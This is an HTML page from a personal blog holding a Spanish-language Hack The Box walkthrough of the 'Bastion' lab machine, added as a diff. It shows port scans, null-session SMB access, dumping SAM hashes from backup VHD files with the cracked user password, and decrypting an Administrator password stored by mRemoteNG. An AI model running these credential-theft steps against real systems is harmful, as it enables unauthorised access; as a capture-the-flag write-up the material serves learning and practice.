@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="/static/img/favicon.ico" />
+    <title>Bastion - Hack The Box - Roskyfrosky Blog</title>
+    <meta name="author" content="Roskyfrosky" />
+    <meta name="description" content="Bastion - Hack The Box" />
+    <meta name="keywords" content="Bastion - Hack The Box, Roskyfrosky Blog, hackthebox" />
+    <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml">
+    <meta content="" property="fb:app_id">
+    <meta content="Roskyfrosky Blog" property="og:site_name">
+
+    
+
+    
+      <meta content="Bastion - Hack The Box" property="og:title">
+      <meta content="article" property="og:type">
+    
+
+    
+      <meta content="This is my personal blog" property="og:description">
+    
+
+    
+      <meta content="https://blog.roskyfrosky.com/hackthebox/2019/09/07/Bastion-hackthebox.html" property="og:url">
+    
+
+    
+      <meta content="2019-09-07T13:11:34+02:00" property="article:published_time">
+      <meta content="https://blog.roskyfrosky.com/about/" property="article:author">
+    
+
+    
+      <meta content="https://blog.roskyfrosky.com/static/img/posts//images/avatares/Bastion.png" property="og:image">
+    
+
+    
+      
+        <meta content="hackthebox" property="article:section">
+      
+    
+
+    
+      
+        <meta content="hackthebox" property="article:tag">
+      
+    
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@roskyfrosky">
+    <meta name="twitter:creator" content="@roskyfrosky">
+
+    
+      <meta name="twitter:title" content="Bastion - Hack The Box">
+    
+
+    
+      <meta name="twitter:url" content="https://blog.roskyfrosky.com/hackthebox/2019/09/07/Bastion-hackthebox.html">
+    
+
+    
+      <meta name="twitter:description" content="This is my personal blog">
+    
+
+    
+
+    <!-- Font awesome icons -->
+    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">
+    <!-- syntax highlighting CSS -->
+    <link rel="stylesheet" href="/static/css/syntax.css">
+    <!-- Bootstrap core CSS -->
+    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,300italic,300,400italic,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/static/css/super-search.css">
+    <link rel="stylesheet" href="/static/css/thickbox.css">
+    <link rel="stylesheet" href="/static/css/projects.css">
+    <link rel="stylesheet" href="/static/css/main.css">
+
+    
+  </head>
+  <body>
+    <div class="container">
+      <div class="col-sm-3">
+        <div class="fixed-condition">
+          <a href="/"><img class="profile-avatar" src="/static/img/avatar.jpg" height="75px" width="75px" /></a>
+          <h1 class="author-name">Roskyfrosky</h1>
+          
+          <div class="social">
+            <ul>
+              
+                <li><a href="https://twitter.com/roskyfrosky" target="_blank"><i class="fa fa-twitter"></i></a></li>
+              
+                <li><a href="https://github.com/roskyfrosky" target="_blank"><i class="fa fa-github"></i></a></li>
+              
+            </ul>
+          </div>
+          <div class="search" id="js-search">
+            <input type="text" placeholder="(sitemap)~$ type to search" class="search__input form-control" id="js-search__input">
+            <ul class="search__results" id="js-search__results"></ul>
+          </div>
+          <hr />
+          <ul class="sidebar-nav">
+            <strong>Navigation</strong>
+            <li><a href="/">Home</a></li>
+            
+              <li><a class="about" href="/about/">About Me</a></li>
+            
+              <li><a class="about" href="/feed.xml">XML Feed</a></li>
+            
+          </ul>
+        </div>
+        <!-- end /.fixed-condition -->
+      </div>
+      <div class="col-sm-8 col-offset-1 main-layout">
+        <header class="post-header">
+  <h1 class="post-title">Bastion - Hack The Box</h1>
+</header>
+
+<span class="time">07 Sep 2019</span>
+
+  <span class="categories">
+    &raquo; <a href="/category/hackthebox">hackthebox</a>
+  </span>
+
+
+<div class="content">
+  <div class="post"><p><img src="/images/avatares/Bastion.png" alt="" class="align-center" /></p>
+
+<h2 id="-resumen-">[ Resumen ]</h2>
+
+<p>Hoy os traigo el writeup de como resolver la máquina Bastion de Hackthebox.Se trata de una máquina de dificultad fácil en la cual tendremos que montar ficheros vhd desde los cuales obtendremos contraseñas dumpeando la SAM y en la que escalaremos privilegios debido al almacenamiento de credenciales por parte del software mRemoteNG.</p>
+
+<h2 id="-00--recon">[ 00 – Recon]</h2>
+
+<p>En primer lugar, como siempre, realizamos un escaneo de puertos rápido con masscan para saber que servicios, tanto udp como tcp, hay abiertos en la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB/Bastion#masscan <span class="nt">-p1-65535</span>,U:1-65535  10.10.10.134 <span class="nt">--rate</span><span class="o">=</span>1000 <span class="nt">-e</span> tun0
+
+Starting masscan 1.0.6 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2019-04-30 13:51:23 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>131070 ports/host]
+Discovered open port 47001/tcp on 10.10.10.134
+Discovered open port 445/tcp on 10.10.10.134
+Discovered open port 135/tcp on 10.10.10.134
+Discovered open port 49667/tcp on 10.10.10.134
+Discovered open port 49670/tcp on 10.10.10.134
+Discovered open port 22/tcp on 10.10.10.134
+Discovered open port 49669/tcp on 10.10.10.134
+Discovered open port 5985/tcp on 10.10.10.134
+Discovered open port 139/tcp on 10.10.10.134
+Discovered open port 49668/tcp on 10.10.10.134
+Discovered open port 49665/tcp on 10.10.10.134
+Discovered open port 49664/tcp on 10.10.10.134
+Discovered open port 49666/tcp on 10.10.10.134
+</code></pre></div></div>
+
+<p>Vemos que hay un montón de puertos abiertos, por lo que vamos a lanzar un nmap para determinar que servicios hay corriendo en esos puertos</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/HTB/Bastion#nmap -sV -sC -oA Bastion bastion.htb -p22,135,139,445,47001,49667,49670,49669,5985,49664,49665,49666,49668
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2019-08-27 08:42 CEST
+Nmap scan report for bastion.htb (10.10.10.134)
+Host is up (0.081s latency).
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey:
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|_  256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 33s, deviation: 0s, median: 33s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2019-08-27T08:43:40+02:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 67.38 seconds
+
+</code></pre></div></div>
+
+<h2 id="-01--getting-access">[ 01 – Getting Access]</h2>
+
+<p>Vemos que está el puerto 445 y 139 abierto, por lo que intentamos entrar con usuario guest, Null, etc y conseguimos acceso con usuario Null mediante el modulo de impacket</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient.py NULL@bastion.htb
+Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation
+
+Password:
+Type help for list of commands
+# shares
+ADMIN$
+Backups
+C$
+IPC$
+</code></pre></div></div>
+
+<p>Dentro de la carpeta backups, encontramos dos ficheros vhd. Los descargamos y los montamos en la máquina para analizar el contenido:</p>
+
+<p><code class="highlighter-rouge">guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt</code></p>
+
+<p>Analizando el contenido del fichero vhd, vemos que podemos mostrar el contenido de la SAM para así ver los usuarios</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mnt/Windows/System32/config# samdump2 SYSTEM SAM
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+</code></pre></div></div>
+
+<p>Ahora que tenemos los hashes del usuario Administrador y del usuario L4mpje, intentamos crackear la contraseña de ambos obteniendo la de L4mpje:</p>
+
+<p>26112010952d963c8dc4217daec986d9 –&gt; bureaulampje</p>
+
+<p>Probamos a conectarnos por ssh con el usuario L4mpje y la contraseña que hemos obtenido del hash y entramos a la máquina.</p>
+
+<p>En el escritorio del usuario L4mpje encontramos el fichero user.txt</p>
+
+<p><img src="/images/Hackthebox/Bastion/user.png" alt="" class="img-responsive" /></p>
+
+<h2 id="-02--priv-esc">[ 02 – Priv. Esc.]</h2>
+
+<p>Trás obtener el user, enumeramos toda la máquina para ver si existen credenciales almacenadas, que programas hay instalados, etc.</p>
+
+<p>Vemos que están los siguientes programas instalados en la máquina</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l4mpje@BASTION C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)&gt;</span>dir
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 0CB3-C487
+
+ Directory of C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span>
+
+22-02-2019  15:01    &lt;DIR&gt;          <span class="nb">.</span>
+22-02-2019  15:01    &lt;DIR&gt;          ..
+16-07-2016  15:23    &lt;DIR&gt;          Common Files
+23-02-2019  10:38    &lt;DIR&gt;          Internet Explorer
+16-07-2016  15:23    &lt;DIR&gt;          Microsoft.NET
+22-02-2019  15:01    &lt;DIR&gt;          mRemoteNG
+23-02-2019  11:22    &lt;DIR&gt;          Windows Defender
+23-02-2019  10:38    &lt;DIR&gt;          Windows Mail
+23-02-2019  11:22    &lt;DIR&gt;          Windows Media Player
+16-07-2016  15:23    &lt;DIR&gt;          Windows Multimedia Platform
+16-07-2016  15:23    &lt;DIR&gt;          Windows NT
+23-02-2019  11:22    &lt;DIR&gt;          Windows Photo Viewer
+16-07-2016  15:23    &lt;DIR&gt;          Windows Portable Devices
+16-07-2016  15:23    &lt;DIR&gt;          WindowsPowerShell
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
+              14 Dir<span class="o">(</span>s<span class="o">)</span>  11.437.113.344 bytes free
+</code></pre></div></div>
+
+<p>Nos fijamos en el programa mRemoteNG ya que es algo que no está instalado por defecto en las máqunias windows. Enumerando más la máquina vemos que existen ficheros del programa mRemoteNG en la ruta \AppData\Roaming.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l4mpje@BASTION C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\m</span>RemoteNG&gt;dir
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 0CB3-C487
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\L</span>4mpje<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\m</span>RemoteNG
+
+22-02-2019  15:03    &lt;DIR&gt;          <span class="nb">.</span>
+22-02-2019  15:03    &lt;DIR&gt;          ..
+22-02-2019  15:03             6.316 confCons.xml
+22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup
+22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup
+22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup
+22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup
+22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup
+22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup
+22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup
+22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup
+22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup
+22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup
+22-02-2019  15:03                51 extApps.xml
+22-02-2019  15:03             5.217 mRemoteNG.log
+22-02-2019  15:03             2.245 pnlLayout.xml
+22-02-2019  15:01    &lt;DIR&gt;          Themes
+              14 File<span class="o">(</span>s<span class="o">)</span>         76.577 bytes
+               3 Dir<span class="o">(</span>s<span class="o">)</span>  11.437.113.344 bytes free
+</code></pre></div></div>
+
+<p>Vemos el contenido del fichero confCons.xml (pego la parte del admin solo)</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;mrng:Connections</span> <span class="na">xmlns:mrng=</span><span class="s">"http://mremoteng.org"</span> <span class="na">Name=</span><span class="s">"Connections"</span> <span class="na">Export=</span><span class="s">"false"</span> <span class="na">EncryptionEngine=</span><span class="s">"AES"</span> <span class="na">BlockCipherMode=</span><span class="s">"GCM"</span> <span class="na">KdfIterations=</span><span class="s">"1000"</span> <span class="na">FullFileEncryption=</span><span class="s">"false"</span> <span class="na">Protected=</span><span class="s">"ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA"</span> <span class="na">ConfVersion=</span><span class="s">"2.6"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;Node</span> <span class="na">Name=</span><span class="s">"DC"</span> <span class="na">Type=</span><span class="s">"Connection"</span> <span class="na">Descr=</span><span class="s">""</span> <span class="na">Icon=</span><span class="s">"mRemoteNG"</span> <span class="na">Panel=</span><span class="s">"General"</span> <span class="na">Id=</span><span class="s">"500e7d58-662a-44d4-aff0-3a4f547a3fee"</span> <span class="na">Username=</span><span class="s">"Administrator"</span> <span class="na">Domain=</span><span class="s">""</span> <span class="na">Password=</span><span class="s">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span> <span class="na">Hostname=</span><span class="s">"127.0.0.1"</span> <span class="na">Protocol=</span><span class="s">"RDP"</span> <span class="na">PuttySession=</span><span class="s">"Default Settings"</span> <span class="na">Port=</span><span class="s">"3389"</span> <span class="na">ConnectToConsole=</span><span class="s">"false"</span> <span class="na">UseCredSsp=</span><span class="s">"true"</span> <span class="na">RenderingEngine=</span><span class="s">"IE"</span> <span class="na">ICAEncryptionStrength=</span><span class="s">"EncrBasic"</span> <span class="na">RDPAuthenticationLevel=</span><span class="s">"NoAuth"</span> <span class="na">RDPMinutesToIdleTimeout=</span><span class="s">"0"</span> <span class="na">RDPAlertIdleTimeout=</span><span class="s">"false"</span> <span class="na">LoadBalanceInfo=</span><span class="s">""</span> <span class="na">Colors=</span><span class="s">"Colors16Bit"</span> <span class="na">Resolution=</span><span class="s">"FitToWindow"</span> <span class="na">AutomaticResize=</span><span class="s">"true"</span> <span class="na">DisplayWallpaper=</span><span class="s">"false"</span> <span class="na">DisplayThemes=</span><span class="s">"false"</span> <span class="na">EnableFontSmoothing=</span><span class="s">"false"</span> <span class="na">EnableDesktopComposition=</span><span class="s">"false"</span> <span class="na">CacheBitmaps=</span><span class="s">"false"</span> <span class="na">RedirectDiskDrives=</span><span class="s">"false"</span> <span class="na">RedirectPorts=</span><span class="s">"false"</span> <span class="na">RedirectPrinters=</span><span class="s">"false"</span> <span class="na">RedirectSmartCards=</span><span class="s">"false"</span> <span class="na">RedirectSound=</span><span class="s">"DoNotPlay"</span> <span class="na">SoundQuality=</span><span class="s">"Dynamic"</span> <span class="na">RedirectKeys=</span><span class="s">"false"</span> <span class="na">Connected=</span><span class="s">"false"</span> <span class="na">PreExtApp=</span><span class="s">""</span> <span class="na">PostExtApp=</span><span class="s">""</span> <span class="na">MacAddress=</span><span class="s">""</span> <span class="na">UserField=</span><span class="s">""</span> <span class="na">ExtApp=</span><span class="s">""</span> <span class="na">VNCCompression=</span><span class="s">"CompNone"</span> <span class="na">VNCEncoding=</span><span class="s">"EncHextile"</span> <span class="na">VNCAuthMode=</span><span class="s">"AuthVNC"</span> <span class="na">VNCProxyType=</span><span class="s">"ProxyNone"</span> <span class="na">VNCProxyIP=</span><span class="s">""</span> <span class="na">VNCProxyPort=</span><span class="s">"0"</span> <span class="na">VNCProxyUsername=</span><span class="s">""</span> <span class="na">VNCProxyPassword=</span><span class="s">""</span> <span class="na">VNCColors=</span><span class="s">"ColNormal"</span> <span class="na">VNCSmartSizeMode=</span><span class="s">"SmartSAspect"</span> <span class="na">VNCViewOnly=</span><span class="s">"false"</span> <span class="na">RDGatewayUsageMethod=</span><span class="s">"Never"</span> <span class="na">RDGatewayHostname=</span><span class="s">""</span> <span class="na">RDGatewayUseConnectionCredentials=</span><span class="s">"Yes"</span> <span class="na">RDGatewayUsername=</span><span class="s">""</span> <span class="na">RDGatewayPassword=</span><span class="s">""</span> <span class="na">RDGatewayDomain=</span><span class="s">""</span> <span class="na">InheritCacheBitmaps=</span><span class="s">"false"</span> <span class="na">InheritColors=</span><span class="s">"false"</span> <span class="na">InheritDescription=</span><span class="s">"false"</span> <span class="na">InheritDisplayThemes=</span><span class="s">"false"</span> <span class="na">InheritDisplayWallpaper=</span><span class="s">"false"</span> <span class="na">InheritEnableFontSmoothing=</span><span class="s">"false"</span> <span class="na">InheritEnableDesktopComposition=</span><span class="s">"false"</span> <span class="na">InheritDomain=</span><span class="s">"false"</span> <span class="na">InheritIcon=</span><span class="s">"false"</span> <span class="na">InheritPanel=</span><span class="s">"false"</span> <span class="na">InheritPassword=</span><span class="s">"false"</span> <span class="na">InheritPort=</span><span class="s">"false"</span> <span class="na">InheritProtocol=</span><span class="s">"false"</span> <span class="na">InheritPuttySession=</span><span class="s">"false"</span> <span class="na">InheritRedirectDiskDrives=</span><span class="s">"false"</span>
+ <span class="na">InheritRedirectKeys=</span><span class="s">"false"</span> <span class="na">InheritRedirectPorts=</span><span class="s">"false"</span> <span class="na">InheritRedirectPrinters=</span><span class="s">"false"</span> <span class="na">InheritRedirectSmartCards=</span><span class="s">"false"</span> <span class="na">InheritRedirectSound=</span><span class="s">"false"</span> <span class="na">InheritSoundQuality=</span><span class="s">"false"</span> <span class="na">InheritResolution=</span><span class="s">"false"</span> <span class="na">InheritAutomaticResize=</span><span class="s">"false"</span> <span class="na">InheritUseConsoleSession=</span><span class="s">"false"</span> <span class="na">InheritUseCredSsp=</span><span class="s">"false"</span> <span class="na">InheritRenderingEngine=</span><span class="s">"false"</span> <span class="na">InheritUsername=</span><span class="s">"false"</span> <span class="na">InheritICAEncryptionStrength=</span><span class="s">"false"</span> <span class="na">InheritRDPAuthenticationLevel=</span><span class="s">"false"</span> <span class="na">InheritRDPMinutesToIdleTimeout=</span><span class="s">"false"</span> <span class="na">InheritRDPAlertIdleTimeout=</span><span class="s">"false"</span> <span class="na">InheritLoadBalanceInfo=</span><span class="s">"false"</span> <span class="na">InheritPreExtApp=</span><span class="s">"false"</span> <span class="na">InheritPostExtApp=</span><span class="s">"false"</span> <span class="na">InheritMacAddress=</span><span class="s">"false"</span> <span class="na">InheritUserField=</span><span class="s">"false"</span> <span class="na">InheritExtApp=</span><span class="s">"false"</span> <span class="na">InheritVNCCompression=</span><span class="s">"false"</span> <span class="na">InheritVNCEncoding=</span><span class="s">"false"</span> <span class="na">InheritVNCAuthMode=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyType=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyIP=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyPort=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyUsername=</span><span class="s">"false"</span> <span class="na">InheritVNCProxyPassword=</span><span class="s">"false"</span> <span class="na">InheritVNCColors=</span><span class="s">"false"</span> <span class="na">InheritVNCSmartSizeMode=</span><span class="s">"false"</span> <span class="na">InheritVNCViewOnly=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayUsageMethod=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayHostname=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayUseConnectionCredentials=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayUsername=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayPassword=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayDomain=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+
+<p>Vemos que tenemos la contraseña del administrador, pero está cifrada con AES.</p>
+
+<p>Buscando por internet, encontramos un script que crackea la contraseña para el programa mRemoteNG.</p>
+
+<p><a href="https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py">https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
+Password: thXLHM96BeKL0ER2
+</code></pre></div></div>
+<p>Accedemos por ssh como usuario administrador y obtenemos root.txt</p>
+
+<p><img src="/images/Hackthebox/Bastion/administrator.png" alt="" class="img-responsive" /></p>
+
+</div>
+  <div class="share-page">
+  <span style="float: left;">Share this on &rarr;&nbsp;&nbsp;</span>
+
+  <!-- Twitter -->
+  <a href="https://twitter.com/share" class="twitter-share-button" data-via="roskyfrosky">Tweet</a>
+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+  <!-- Google + -->
+  <div class="g-plus" data-action="share" data-annotation="bubble"></div>
+  <script src="https://apis.google.com/js/platform.js" async defer></script>
+
+  <!-- Facebook -->
+  <div class="fb-share-button" data-href="https://blog.roskyfrosky.com/hackthebox/2019/09/07/Bastion-hackthebox.html" data-layout="button_count" style="position: relative; top: -8px; left: 3px;"></div>
+</div>
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6&appId=";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+</div>
+
+
+  
+    
+      
+        
+          
+            
+            <div class="panel-body">
+              <h4>Related Posts</h4>
+              <ul>
+            
+                <li class="relatedPost">
+                  <a href="https://blog.roskyfrosky.com/hackthebox/2019/09/14/Luke-hackthebox.html">Luke - Hack The Box</a>
+                  
+                    (Categories: <a href="/category/hackthebox">hackthebox</a>)
+                  
+                </li>
+          
+          
+        
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+            
+                <li class="relatedPost">
+                  <a href="https://blog.roskyfrosky.com/hackthebox/2018/11/20/Jerry-hackthebox.html">Jerry - Hack The Box</a>
+                  
+                    (Categories: <a href="/category/hackthebox">hackthebox</a>)
+                  
+                </li>
+          
+          
+        
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+    
+      
+        
+          
+      
+    
+  
+  
+  </ul>
+</div>
+
+
+<div class="PageNavigation">
+  
+    <a class="prev" href="/hackthebox/2018/11/20/Jerry-hackthebox.html">&laquo; Jerry - Hack The Box</a>
+  
+  
+    <a class="next" href="/hackthebox/2019/09/14/Luke-hackthebox.html">Luke - Hack The Box &raquo;</a>
+  
+</div>
+
+
+<div id="disqus_thread"></div>
+<script>
+
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://roskyfrosky-github-io.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+        <footer>
+          &copy; Roskyfrosky
+          
+            - <a href="https://github.com/roskyfrosky">https://github.com/roskyfrosky</a> - Powered by Jekyll.
+          
+        </footer>
+      </div>
+      <!-- end /.col-sm-8 -->
+    </div>
+    <!-- end /.container -->
+
+    <!-- Bootstrap core JavaScript -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script src="//code.jquery.com/jquery-migrate-1.2.1.min.js"></script>
+    <script src="/static/js/bootstrap.min.js"></script>
+    <script src="/static/js/super-search.js"></script>
+    <script src="/static/js/thickbox-compressed.js"></script>
+    <script src="/static/js/projects.js"></script>
+  </body>
+</html>
+
